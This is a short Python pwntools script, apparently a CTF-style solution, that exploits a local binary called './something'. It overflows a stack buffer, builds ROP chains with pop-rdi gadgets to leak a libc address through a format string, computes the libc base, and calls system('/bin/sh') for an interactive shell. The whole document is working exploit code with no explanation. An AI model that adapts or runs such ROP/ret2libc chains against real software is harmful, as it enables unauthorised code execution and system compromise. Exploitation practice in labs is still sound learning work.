from pwn import*

p = process('./something')
gdb.attach(p, api=True)
p.recvuntil(b'something : ')
Libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
strstr = 0x00404500
pop_rdi_ret = 0x00000000004012a3
gets = 0x0000000000401090
printf = 0x0000000000401080
vuln = 0x00000000004011dd
ret = 0x000000000040101a

payload = b'A'*40 + p64(ret) + p64(pop_rdi_ret) + p64(strstr) + p64(gets)
payload += p64(ret) + p64(pop_rdi_ret) + p64(strstr) + p64(printf) 
payload += p64(ret) + p64(vuln)
p.sendline(payload)

payload = b"%3$p"
p.sendline(payload)

p.recvuntil(b'0x')
stdin = int(p.recv(12),16)
print(hex(stdin))

stdin_libc = 0x00000000001f2a80
libc_base = stdin - Libc.symbols['IO_2_1_stdin']
print(hex(libc_base))

system = 0x000000000004a4e0
system += libc_base
binsh = 0x1b1117
binsh += libc_base
payload = b'a'*40 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()

#libc_base = <object>
